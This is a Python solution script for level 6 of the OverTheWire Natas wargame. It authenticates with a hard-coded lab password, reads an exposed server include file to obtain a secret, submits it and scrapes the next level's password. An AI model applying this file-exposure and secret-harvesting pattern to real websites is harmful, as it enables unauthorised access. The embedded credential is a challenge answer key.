import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas6', 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')
def get_pass():
    secretr = requests.post('http://natas6.natas.labs.overthewire.org/includes/secret.inc', auth=auth)
    secretwebcontent = secretr.text
    i = secretwebcontent.find('= "')+3
    secret = secretwebcontent[i:secretwebcontent.find(';')-1]
    dat = {'secret':secret, 'submit':'Submit'}
    r = requests.post('http://natas6.natas.labs.overthewire.org/', auth=auth, data=dat)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
